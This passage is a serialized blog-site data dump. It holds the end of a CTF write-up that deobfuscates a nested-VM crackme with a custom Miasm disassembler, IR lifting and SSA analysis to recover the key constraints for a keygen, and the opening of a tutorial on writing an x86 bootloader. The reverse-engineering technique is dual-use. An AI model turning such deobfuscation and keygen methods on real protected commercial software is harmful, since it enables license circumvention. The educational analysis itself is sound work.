1\u003C/span>\u003Cspan style=\"color:#F97583\"> else\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> []\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">        print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"  \u003C/span>\u003Cspan style=\"color:#79B8FF\">{hex\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(opcode)\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> -> \u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">mnemonic\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> operands:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            addop(mnemonic, [bs32(opcode), operands[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]])\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        else\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            addop(mnemonic, [bs32(opcode)])\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">#\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Bytecode loader\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">#\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> load_vm_bytecodes\u003C/span>\u003Cspan style=\"color:#E1E4E8\">():\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">    \"\"\"Load initial and nested VM bytecode blobs.\"\"\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    blobs \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> []\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    with\u003C/span>\u003Cspan style=\"color:#79B8FF\"> open\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"vmv_bytecode.bin\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"rb\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">as\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> f:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        blobs.append(f.read())\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    with\u003C/span>\u003Cspan style=\"color:#79B8FF\"> open\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"vmv_nested_bytecode.bin\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"rb\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">as\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> f:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        while\u003C/span>\u003Cspan style=\"color:#79B8FF\"> True\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            hdr \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> f.read(\u003C/span>\u003Cspan style=\"color:#79B8FF\">4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">            if\u003C/span>\u003Cspan style=\"color:#F97583\"> not\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> hdr:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">                break\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            count \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> struct.unpack(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"&#x3C;I\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, hdr)[\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            blobs.append(f.read(count \u003C/span>\u003Cspan style=\"color:#F97583\">*\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003Cspan style=\"color:#E1E4E8\">))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> blobs\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">#\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># Main analysis loop\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">#\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">machine \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> Machine(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"vmv\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">bytecodes \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> load_vm_bytecodes()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"[+] detected \u003C/span>\u003Cspan style=\"color:#79B8FF\">{len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(bytecodes)\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> VM layers\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">results \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> []\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">entry \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> 0x\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> level, bc \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#79B8FF\"> enumerate\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(bytecodes, \u003C/span>\u003Cspan style=\"color:#FFAB70\">start\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#E1E4E8\">):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#79B8FF\">    print\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"[vm\u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">level\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">] bytecode size: \u003C/span>\u003Cspan style=\"color:#79B8FF\">{len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(bc) \u003C/span>\u003Cspan style=\"color:#F97583\">//\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003Cspan style=\"color:#F97583\">:#x\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    vm_opcodes \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> defaultdict(\u003C/span>\u003Cspan style=\"color:#79B8FF\">int\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    loc_db \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> LocationDB()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    mdis \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> machine.dis_engine(bc, \u003C/span>\u003Cspan style=\"color:#FFAB70\">loc_db\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\">loc_db)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    mdis.dis_block_callback \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> vm_opcode_probe\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    asmcfg \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> mdis.dis_multiblock(entry)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    results.append((loc_db, asmcfg))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    dump_cfg(\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        asmcfg,\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"output/vmv_asmcfg\u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">level\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">.dot\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    )\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    arch_vmv.nest_level \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    if\u003C/span>\u003Cspan style=\"color:#79B8FF\"> len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(vm_opcodes) \u003C/span>\u003Cspan style=\"color:#F97583\">==\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 24\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        register_vm_opcodes(vm_opcodes, level)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">#\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\"># IR lifting (final VM layer)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">#\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">nl \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 4\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">loc_db, asmcfg \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> results[nl]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">ira \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> machine.ira(loc_db)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">ircfg \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ira.new_ircfg_from_asmcfg(asmcfg)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">dump_cfg(ircfg, \u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"output/vmv_ircfg\u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">nl \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">.dot\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">entry_loc \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> loc_db.get_offset_location(entry)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">simp \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> IRCFGSimplifierCommon(ira)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">simp.simplify(ircfg, entry_loc)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">dump_cfg(ircfg, \u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"output/vmv_ircfg_simp_common\u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">nl \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">.dot\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">simp \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> IRCFGSimplifierSSA(ira)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">simp.simplify(ircfg, entry_loc)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">dump_cfg(ircfg, \u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"output/vmv_ircfg_simp_ssa\u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">nl \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 1}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">.dot\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>At some point while trying to hook my VM into Miasm, I ran into this error saying that miasm.arch.vmv.jit did not contain something called jitter_vmv. After some digging, I realized this wasn’t actually a VM bug but a Miasm integration issue. When Miasm loads a new architecture through machine.py, it assumes that a JIT (Just-In-Time execution) backend exists and tries to import it automatically. In my case, vmv/jit.py turned out to be completely empty, so there was nothing named jitter_vmv to import. Since my disassembly and analysis pipeline never used the JIT at all, the simplest fix was to remove the JIT-related import lines for vmv inside machine.py. This effectively told Miasm that the vmv architecture does not support JIT execution, which was totally fine for static disassembly and IR lifting.\u003C/p>\n\u003Cp>After fixing the JIT issue, Miasm failed again, this time complaining about a missing LifterModelCallVmv class in vmv/ira.py. This was another case of Miasm expecting a conventionally named class without checking whether it actually existed. I opened vmv/ira.py and found that it instead defined classes named ir_a_vmv_base and ir_a_vmv. Based on the existing Miasm architectures and how the lifter is usually named, it was clear that ir_a_vmv was the correct lifter to use. To fix this, I updated the vmv branch in machine.py to import ir_a_vmv instead of LifterModelCallVmv. Once this change was made, Miasm could successfully lift VM instructions into IR without looking for non-existent classes\u003C/p>\n\u003Cp>With my knowledge , ill try to summarise how jitter the execution layer works :(\u003C/p>\n\u003Cp>Miasm has a component called \u003Cstrong>Jitter\u003C/strong>, which is used to \u003Cem>execute\u003C/em> instructions after they have been translated into Miasm’s intermediate representation (IR). You can think of Jitter as a simple emulator that understands IR instead of raw machine code. It keeps track of things like registers, memory, and the current instruction pointer, and then steps through instructions one by one.\u003C/p>\n\u003Cp>At the core of this system is a generic \u003Ccode>Jitter\u003C/code> class, which provides common execution logic that works the same for every architecture. On top of that, Miasm defines architecture-specific subclasses such as \u003Ccode>jitter_x86_64\u003C/code>, \u003Ccode>jitter_arm\u003C/code>, or \u003Ccode>jitter_mips32\u003C/code>. Each of these subclasses explains how instructions for that particular CPU should behave at runtime. This is why Miasm’s documentation shows a large inheritance diagram: many different architectures all extend the same base Jitter class.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-32.png\" alt=\"image\">\u003C/p>\n\u003Cp>Jitter is also closely tied to \u003Cstrong>symbolic execution\u003C/strong>. Instead of running instructions with real concrete values, Miasm can execute them symbolically, meaning registers and memory can hold expressions rather than actual numbers. As Jitter steps through instructions, it updates these symbolic expressions and builds constraints that describe how program inputs affect the program state. This is useful for exploring multiple execution paths, understanding key checks, or reasoning about conditions without needing a specific input. In short, symbolic execution uses Jitter as its execution engine, but replaces concrete values with symbolic ones.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-33.png\" alt=\"image\">\u003C/p>\n\u003Cp>Each layer produced an assembly-level CFG (\u003Cem>_asmcfg\u003C/em>.png), which shows the decoded VM instructions and their control flow, and for the final VM layer an IR-level CFG (\u003Cem>_ircfg\u003C/em>.png) was also generated\r\n\u003Cimg src=\"/images/posts/vmware/image-34.png\" alt=\"image\">\u003C/p>\n\u003Cp>Ng\u003C/p>\n\u003Cp>After setting up the custom disassembler, I began analyzing the generated assembly-level control flow graphs (CFGs) for each VM layer. These graphs show the decoded VM instructions and how control flows within each virtual machine. Since the challenge uses nested virtualization, examining these CFGs layer by layer helps understand how complexity is gradually peeled away until the real logic is exposed.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-35.png\" alt=\"VM Layer 1 CFG\">\u003C/p>\n\u003Cp>The first VM layer is the largest and most complex. It is dominated by dispatcher logic: instruction fetch loops, register movement, memory initialization, and indirect jumps. At this stage, the VM mainly focuses on setting up the execution environment and preparing the next bytecode buffer. There are no meaningful input-dependent checks here, only infrastructure code required to emulate the VM.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-36.png\" alt=\"VM Layer 2 CFG\">\u003C/p>\n\u003Cp>The second VM layer closely resembles the first. While some constants and register roles differ due to re-encoding, the overall structure remains the same: a large dispatcher loop with instruction handlers branching from it.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-37.png\" alt=\"VM Layer 3 CFG\">\u003C/p>\n\u003Cp>By the third VM layer, the CFG begins to shrink slightly. While dispatcher logic is still clearly visible, there are fewer blocks and less overall noise.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-38.png\" alt=\"VM Layer 4 CFG\">\u003C/p>\n\u003Cp>Although a dispatcher is still present, the CFG is noticeably smaller and more structured. Many repetitive VM bookkeeping blocks disappear tho\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-39.png\" alt=\"VM Layer 5 CFG\">\u003C/p>\n\u003Cp>The CFG is much smaller and no longer dominated by VM dispatch infrastructure. Instead, it consists of relatively straight-line code with arithmetic operations and branches based on computed values.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-40.png\" alt=\"Final SSA IR CFG\">\u003C/p>\n\u003Cp>The VM abstraction is very less honestly and we can see the register data’s etc .\u003C/p>\n\u003Cp>From the SSA graph, it becomes clear that the input key is read from the VM ROM buffer in four 32-bit chunks. These correspond to the 16-byte input split as input[0:4], input[4:8], input[8:12], and input[12:16]. Each chunk is processed independently through a sequence of arithmetic checks. The first and third chunks are multiplied by fixed constants and reduced modulo 0x7fffffff, with the result compared against the value 1. This directly translates into modular inverse equations. The second and fourth chunks are validated using two different modulo comparisons each, forming classic Chinese Remainder Theorem (CRT) constraints.\u003C/p>\n\u003Cp>Only if all constraints succeed does execution reach the final block, which consists of a series of putchar calls that print the flag one character at a time.\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-41.png\" alt=\"image\">\u003C/p>\n\u003Cp>So i made a smol keygen\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-42.png\" alt=\"image\">\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/vmware/image-43.png\" alt=\"image\">\u003C/p>\n\u003Ch3 id=\"references\">References\u003C/h3>\n\u003Cul>\n\u003Cli>\n\u003Cp>Miasm official blog and documentation\r\n\u003Ca href=\"https://miasm.re/blog/\">https://miasm.re/blog/\u003C/a>\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Miasm v0.1.0 release notes (IRCFG, SSA, symbolic execution improvements)\r\n\u003Ca href=\"https://miasm.re/blog/2018/12/20/release_v0_1_0.html\">https://miasm.re/blog/2018/12/20/release_v0_1_0.html\u003C/a>\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Tigress-based protection and virtualization examples\r\n\u003Ca href=\"https://github.com/JonathanSalwan/Tigress_protection\">https://github.com/JonathanSalwan/Tigress_protection\u003C/a>\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Dynamic Symbolic Execution with Miasm (crash course + crackme coverage)\r\n\u003Ca href=\"https://miasm.re/blog/2017/10/05/playing_with_dynamic_symbolic_execution.html\">https://miasm.re/blog/2017/10/05/playing_with_dynamic_symbolic_execution.html\u003C/a>\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Data flow analysis and dependency graphs in Miasm\r\n\u003Ca href=\"https://miasm.re/blog/2017/02/03/data_flow_analysis_depgraph.html\">https://miasm.re/blog/2017/02/03/data_flow_analysis_depgraph.html\u003C/a>\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Nanomite-protected binary analysis using Miasm symbolic execution\r\n\u003Ca href=\"https://doar-e.github.io/blog/2014/10/11/taiming-a-wild-nanomite-protected-mips-binary-with-symbolic-execution-no-such-crackme/\">https://doar-e.github.io/blog/2014/10/11/taiming-a-wild-nanomite-protected-mips-binary-with-symbolic-execution-no-such-crackme/\u003C/a>\u003C/p>\n\u003C/li>\n\u003Cli>\n\u003Cp>Deobfuscation of OLLVM-protected programs (Quarkslab)\r\n\u003Ca href=\"https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html\">https://blog.quarkslab.com/deobfuscation-recovering-an-ollvm-protected-program.html\u003C/a>\u003C/p>\n\u003C/li>\n\u003C/ul>",{"headings":754,"localImagePaths":768,"remoteImagePaths":769,"frontmatter":770,"imagePaths":772},[755,758,761,764,767],{"depth":27,"slug":756,"text":757},"halt-opcode","HALT Opcode",{"depth":27,"slug":759,"text":760},"load_reg-opcode","LOAD_REG Opcode",{"depth":27,"slug":762,"text":763},"putchar-opcode","PUTCHAR Opcode",{"depth":40,"slug":765,"text":766},"why-miasm","WHy miasm ??",{"depth":40,"slug":611,"text":612},[],[],{"title":746,"date":771},"2025-12-12",[],"bootloader",{"id":773,"data":775,"body":778,"filePath":779,"digest":780,"rendered":781},{"title":776,"date":777},"A minimal x86 bootloader from scratch",["Date","2026-02-09T00:00:00.000Z"],"# Building a Bootloader from Scratch: A Deep Dive into x86 Boot Process\r\n\r\n![Bootloader Introduction](/images/posts/bootloader/intro.png)\r\n\r\nSo you want to understand how computers actually boot? Not the handwavy \"BIOS loads the OS\" explanation, but the real, low-level mechanics of what happens when you hit the power button? Good \r\n\r\nThis project is a minimal but complete bootloader that takes you from the moment the CPU starts executing at power-on, through loading code from disk, setting up memory segmentation, switching processor modes, and finally running C code. It's about 100 lines of assembly and 5 lines of C . \r\n\r\n\r\n\r\n\r\n## The Problem We're Solving\r\n\r\nModern operating systems are complicated beasts. Linux is millions of lines of code. Windows is even more. But they all start the same way: with 512 bytes of code loaded by the BIOS at a specific memory address. That's it\r\n\r\nThose 512 bytes need to:\r\n- Set up a working environment\r\n- Load more code from disk (because 512 bytes isn't enough for anything useful)\r\n- Switch the CPU from 1981 compatibility mode into something resembling modern computing\r\n- Transfer control to your actual operating system\r\n\r\nThe bootloader presented here is the smallest practical path from power-on to executing C code. It relies solely on handwritten x86 assembly interacting directly with the CPU and BIOS, deliberately avoiding any external boot infrastructure.\r\n\r\n# WHY \r\n\r\n![Why Learn This](/images/posts/bootloader/2.gif)\r\n\r\nMost modern development never gets anywhere near this layer, and the system is usually content to keep its earliest steps politely out of sight. Still, understanding those first instructions changes how the rest of the stack makes sense.\r\n\r\nWorking at this level forces you to confront how memory behaves in physical terms. Not heap allocators and convenient abstractions, but real addresses, segmentation rules, and the structures that determine how the processor interprets space.\r\n\r\nIt also replaces the idea of a “virtual” machine with the one that actually exists.\r\n\r\n## The Boot Process: What Actually Happens\r\n\r\n### Power On\r\n\r\nWhen you press the power button, here's what happens:\r\n\r\n1. **Power supply stabilizes** - Takes a few milliseconds\r\n2. **CPU reset line goes high** - CPU starts executing\r\n3. **CPU jumps to firmware** - On x86, this is address `0xFFFFFFF0` (yes, near the top of the 32-bit address space)\r\n4. **BIOS/UEFI runs** - Checks hardware, runs POST (Power-On Self Test)\r\n5. **BIOS looks for boot device** - Checks floppy, hard drive, CD-ROM, USB, network, whatever boot order you set\r\n6. **BIOS reads first sector** - Takes 512 bytes from sector 0 of the boot device\r\n7. **BIOS checks magic number** - Last two bytes must be `0x55 0xAA` (little-endian for `0xAA55`)\r\n8. **If valid, BIOS loads it to 0x7C00** - This address is hardcoded in the BIOS\r\n9. **BIOS jumps to 0x7C00** - Your code is now running!\r\n\r\nAt this point, you're executing in 16-bit real mode, you have access to BIOS interrupts, and you have 512 bytes to do something useful.\r\n\r\n### Why 0x7C00?\r\n\r\n![Why 0x7C00](/images/posts/bootloader/3.gif)\r\n\r\nThis is one of those historical quirks. The original IBM PC had 32KB of RAM. The BIOS used the first section for its data structures and interrupt vectors. The boot sector needed to be high enough to not conflict with BIOS data, but low enough to leave space for the boot program to set up a 